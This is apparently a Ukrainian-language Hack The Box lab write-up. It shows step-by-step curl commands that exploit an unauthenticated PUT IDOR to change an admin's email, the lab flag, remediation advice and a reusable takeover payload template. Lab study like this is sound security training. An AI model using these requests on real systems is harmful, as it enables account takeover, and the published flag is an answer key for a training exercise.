# Web Attacks — IDOR via Insecure PUT (Mass Assignment / Unauthorized Update)

Модуль: [Web Attacks](https://academy.hackthebox.com/app/module/134)
Секція: [IDOR in Insecure APIs — Modifying Data](https://academy.hackthebox.com/app/module/134/section/1200)
Ціль: 154.57.164.70:31879
Відповідь: `HTB{1_4m_4n_1d0r_m4573r}`

## Концепція

Це фінальний, найнебезпечніший різновид IDOR у цьому модулі — не read-only (GET), а **write-IDOR**: API дозволяє змінювати дані будь-якого об'єкта через `PUT /profile/api.php/profile/{uid}` без перевірки, чи авторизований запитувач редагувати саме цей `uid`. Раніше ми лише читали чужі профілі (GET), тепер той самий шлях приймає `PUT` і оновлює запис у БД — це ескалує вразливість з витоку даних (read) до повноцінного захоплення облікового запису (write), включно з обліковим записом адміністратора.

Важливий нюанс: API вимагає повний JSON-об'єкт профілю (uid, uuid, role, full_name, email, about), а не лише поле, що змінюється. Тобто спершу потрібно **прочитати поточний стан об'єкта** (GET), а потім відправити той самий об'єкт назад через PUT зі зміненим одним полем — інакше сервер або відхилить запит, або затре решту полів `null`/порожніми значеннями.

## Крок 1 — Знаходимо адміна серед uid (IDOR-читання з попереднього кроку)

```bash
curl -s "http://154.57.164.70:31879/profile/api.php/profile/10" | python3 -m json.tool
```

Результат показує `"role": "staff_admin"`, `"full_name": "admin"`, `"email": "admin@employees.htb"` — знайшли цільовий акаунт для атаки (uid=10).

## Крок 2 — Формуємо PUT-запит з повним об'єктом і зміненим email

```bash
url="http://154.57.164.70:31879"

curl -s -X PUT "$url/profile/api.php/profile/10" \
  -H "Content-Type: application/json" \
  -d '{
    "uid":"10",
    "uuid":"bfd92386a1b48076792e68b596846499",
    "role":"staff_admin",
    "full_name":"admin",
    "email":"flag@idor.htb",
    "about":"Never gonna give you up, Never gonna let you down"
  }'
```

Пояснення логіки:
- `-X PUT` — метод, призначений для повного оновлення ресурсу; саме цей метод API приймає без будь-якої перевірки авторизації чи ролі поточного (неавторизованого) клієнта.
- Тіло запиту повторює **всі** поля з попереднього GET-запиту, змінюючи лише `email` — це критично, бо `uuid` і `role` теж потрібно передати назад незмінними, інакше сервер або відхилить запит (валідація структури), або перезапише ці поля порожніми значеннями (класична проблема Mass Assignment/PUT semantics).
- Сервер повернув `1` — типова відповідь на успішний `UPDATE ... WHERE uid=10` (кількість змінених рядків), що підтверджує успіх операції ще до перевірки.

## Крок 3 — Верифікуємо зміну через GET

```bash
curl -s "$url/profile/api.php/profile/10" | python3 -m json.tool
```

Результат:
```json
{
    "uid": "10",
    "uuid": "bfd92386a1b48076792e68b596846499",
    "role": "staff_admin",
    "full_name": "admin",
    "email": "flag@idor.htb",
    "about": "Never gonna give you up, Never gonna let you down"
}
```
Email адміна успішно змінено, попри те, що запит виконано абсолютно неавторизованим клієнтом.

## Крок 4 — Отримуємо флаг на сторінці Edit Profile

```bash
curl -s "$url/profile/index.php?uid=10"
```

Frontend-логіка сторінки перевіряє поточний email профілю і, побачивши збіг з `flag@idor.htb`, вставляє флаг прямо в HTML:
```
HTB{1_4m_4n_1d0r_m4573r}
```

## Чому це працює (root cause для звіту)

- **Опис:** API-ендпоінт `/profile/api.php/profile/{uid}` дозволяє виконувати `PUT`-запити на оновлення профілю будь-якого користувача (включно з роллю `staff_admin`) без перевірки авторизації запитувача.
- **Технічні деталі:** Відсутня перевірка Broken Object Level Authorization (BOLA) — сервер не звіряє `uid` з ідентифікатором сесії/токена клієнта перед виконанням `UPDATE`; додатково немає розмежування прав на рівні полів (Mass Assignment), тобто будь-який клієнт може змінити чутливі атрибути (`email`, потенційно `role`) через один і той самий загальний ендпоінт.
- **Ризик/Імпакт:** Full Account Takeover — неавторизований користувач може змінити email адміністратора (а потенційно й пароль/роль через ту саму техніку), відкриваючи шлях до захоплення адмін-панелі через функцію "forgot password" на новий email. Це найкритичніший клас IDOR — від Information Disclosure (API1) до повного компрометування облікового запису.
- **Рекомендації:** Перевіряти на сервері, що `session.uid === path.uid` перед будь-яким `PUT`/`PATCH`/`DELETE`; впровадити явний allow-list полів, дозволених для самостійного редагування (заборонити зміну `role`, `uuid` через клієнтський API); для чутливих операцій (зміна email/пароля) вимагати повторну автентифікацію та підтвердження через існуючий email.

## Швидкий payload на майбутнє

```bash
url="http://TARGET:PORT"
target_uid=10
profile=$(curl -s "$url/profile/api.php/profile/$target_uid")
new_profile=$(echo "$profile" | jq '.email="attacker@evil.htb"')
curl -s -X PUT "$url/profile/api.php/profile/$target_uid" \
  -H "Content-Type: application/json" -d "$new_profile"
```
